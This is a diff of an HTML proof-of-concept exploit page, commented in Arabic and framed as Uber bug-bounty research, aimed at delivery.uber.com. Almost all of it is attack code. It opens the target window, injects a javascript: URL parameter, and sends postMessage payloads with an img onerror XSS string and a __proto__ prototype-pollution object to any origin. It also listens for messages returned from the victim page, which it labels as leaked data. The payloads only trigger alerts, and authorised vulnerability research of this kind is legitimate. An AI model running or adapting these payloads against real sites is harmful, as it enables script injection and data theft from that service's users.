@@ -1,24 +1,71 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <title>XSS PoC Exploit</title>
+    <meta charset="UTF-8">
+    <title>Uber Analytics Exploit PoC</title>
+    <style>
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #f4f4f4; }
+        .btn { padding: 15px 30px; font-size: 18px; color: white; background-color: #000; border: none; border-radius: 8px; cursor: pointer; transition: 0.3s; }
+        .btn:hover { background-color: #333; }
+        #status { margin-top: 20px; color: #666; }
+    </style>
 </head>
 <body>
-    <h1>Testing PostMessage XSS...</h1>
-    <script>
-        // 1. فتح نافذة Uber المستهدفة
-        const victimUrl = "https://delivery.uber.com/?app_clip=false&source_flow=undefined";
-        const victim = window.open(victimUrl);
 
-        // 2. إرسال الرسالة الخبيثة بعد ثوانٍ من التحميل
-        setTimeout(() => {
-            victim.postMessage({
-                type: "EVENT_BUILD_BOOTSTRAP", // النوع الذي يتوقعه الكود الذي أرسلته
-                pixelCode: "123",
-                // إذا كان هناك ضعف في معالجة البيانات، سيتم تنفيذ الكود
-                data: "<img src=x onerror=alert('XSS_SUCCESS_AT_'+document.domain)>"
-            }, "*"); 
-        }, 5000); // ننتظر 5 ثوانٍ لضمان تحميل الصفحة
+    <h1>Uber Bug Bounty PoC</h1>
+    <p>اضغط على الزر لفتح Uber ومحاولة تشغيل الـ Alert</p>
+
+    <button id="attackBtn" class="btn">Open Uber & Execute Exploit</button>
+
+    <div id="status">الحالة: في انتظار الضغط على الزر...</div>
+
+    <script>
+        const attackBtn = document.getElementById('attackBtn');
+        const status = document.getElementById('status');
+
+        attackBtn.addEventListener('click', () => {
+            // 1. رابط Uber المستهدف (أضفنا بارامترات قد تكون مصابة)
+            const victimUrl = "https://delivery.uber.com/?app_clip=false&source_flow=javascript:alert(1)";
+            
+            // 2. فتح النافذة
+            status.innerText = "الحالة: تم فتح النافذة، ننتظر التحميل...";
+            const victim = window.open(victimUrl, "_blank");
+
+            // 3. محاولة الهجوم عبر postMessage بعد التحميل
+            // ننتظر 6 ثوانٍ لأن الكود الذي أرسلته يتوقف عن الاستماع بعد 8 ثوانٍ
+            setTimeout(() => {
+                if (victim) {
+                    status.innerText = "الحالة: جاري إرسال الـ Payload الخبيث...";
+                    
+                    // هذا الـ Payload يستهدف دالة dispatch و Ss التي وجدناها
+                    const payload = {
+                        type: "fusion-plugin-web-analytics.dispatch",
+                        eventKey: "pageview",
+                        eventPayload: {
+                            // محاولة استغلال الـ Prototype Pollution أو تنفيذ كود
+                            "__proto__": { "polluted": "true" },
+                            "xss": "<img src=x onerror=alert('XSS_Success_Domain_'+document.domain)>"
+                        }
+                    };
+
+                    // إرسال الرسالة باستخدام النجمة كـ Target Origin كما يفعل كود Uber تماماً
+                    victim.postMessage(payload, "*");
+                    
+                    status.innerText = "الحالة: تم إرسال الرسالة. افحص نافذة Uber والـ Console هناك.";
+                } else {
+                    status.innerText = "الحالة: فشل فتح النافذة (تأكد من السماح بالـ Pop-ups).";
+                }
+            }, 6000); 
+        });
+
+        // استماع لأي رسائل مرتدة من Uber (لتسريب البيانات)
+        window.addEventListener("message", (event) => {
+            console.log("رسالة ملتقطة من Uber:", event.data);
+            if (event.data.type) {
+                status.innerHTML += `<br><strong style="color:red;">تم تسريب بيانات: ${event.data.type}</strong>`;
+            }
+        }, false);
     </script>
+
 </body>
 </html>
